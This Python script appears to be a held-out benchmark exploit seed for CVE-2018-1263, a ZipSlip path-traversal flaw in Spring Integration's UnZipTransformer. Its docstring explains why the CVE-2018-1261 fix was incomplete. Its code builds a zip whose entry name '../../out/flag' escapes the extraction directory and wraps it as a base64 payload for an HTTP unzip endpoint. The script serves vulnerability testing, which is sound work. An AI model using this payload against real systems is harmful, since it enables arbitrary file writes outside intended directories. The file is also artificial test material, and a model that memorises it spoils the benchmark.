#!/usr/bin/env python3
"""[HELD-OUT] CVE-2018-1263 residual -- ZipSlip arbitrary file write that bypasses the CVE-2018-1261 fix in
UnZipTransformer via the ZipResultType.BYTE_ARRAY channel.

The CVE-2018-1261 fix (1.0.1.RELEASE) added a path-traversal guard ONLY to the FILE result-type branch of
UnZipTransformer.doZipTransform. The BYTE_ARRAY branch was left UNCHECKED:

    else if (ZipResultType.BYTE_ARRAY.equals(zipResultType)) {
        if (!zipEntry.isDirectory()) {
            byte[] data = IOUtils.toByteArray(zipEntryInputStream);
            uncompressedData.put(zipEntryName, data);   // <-- errant NAME returned to the caller as-is
        }
    }

So on 1.0.1 the framework hands the errant traversal *name* straight back to the caller. Per
spring.io/security/cve-2018-1263: "While the framework itself now does not write such files, it does present the
errant path to the user application, which could inadvertently write the file using that path." The REAL HTTP
service (com.pcb.UnzipHttpService), invoked with POST /unzip?mode=bytes, plays that consuming application: it
writes each returned (name -> bytes) as new File(CONSUME=/work/dest/consume, name), so the "../.." name escapes
workDir and the ${PCB_FLAG} content lands at /work/out/flag OUTSIDE the extraction root /work/dest.

Path geometry (the SAME entry name "../../out/flag" as the FILE seed, so one malicious zip exercises both branches
and lands at the same witness /work/out/flag):
    BYTES branch, V1: no check -> returns {"../../out/flag": flagbytes}; consuming app writes
        new File("/work/dest/consume", "../../out/flag") == /work/out/flag == OUTSIDE /work/dest -> REACHES.
    BYTES branch, V2: checkPath validates new File("/work/dest/<uuid>", "../../out/flag") == /work/out/flag,
        which does NOT start with /work/dest -> transform() THROWS before returning anything -> BLOCKED.

Contract (verified on real Docker via oracle.py):
    * V0 = 1.0.0.RELEASE -> ESCAPE (BYTE_ARRAY branch never checked).
    * V1 = 1.0.1.RELEASE -> ESCAPE: the CVE-2018-1261 fix guards only the FILE branch; BYTE_ARRAY hands back the
                            errant path -> the consuming app writes it outside workDir. <- the incomplete fix.
    * V2 = 1.0.2.RELEASE -> BLOCKED: CVE-2018-1263 fix adds checkPath(message, zipEntryName) to the BYTE_ARRAY
                            branch too, so transform() throws a ZipException before any errant path is returned.

The per-run ${PCB_FLAG} canary flows only as the escaping entry's *content*.
"""
from __future__ import annotations

import base64
import io
import zipfile

# Same escaping entry name as the FILE seed; over the BYTE_ARRAY channel the framework returns it unchecked on
# 1.0.1, and the consuming app's write (base /work/dest/consume) lands it at /work/out/flag OUTSIDE /work/dest.
ESCAPE_ENTRY = "../../out/flag"

# One residual vector is enough; kept as a list to mirror the multi-vector oracle convention.
VECTORS = ["bytearray_returned_path"]


def build_zip(flag: str) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(ESCAPE_ENTRY, flag)   # arcname stored verbatim, incl. the "../.." traversal
    return buf.getvalue()


def candidate(flag: str, vector: str = "bytearray_returned_path"):
    return {
        "id": "cve-2018-1263-" + vector,
        "mode": "bytes",                             # POST /unzip?mode=bytes -> ZipResultType.BYTE_ARRAY
        "zip_b64": base64.b64encode(build_zip(flag)).decode("ascii"),
    }


if __name__ == "__main__":
    import json
    print(json.dumps([candidate("PCBFLAG_demo", v) for v in VECTORS], indent=2))
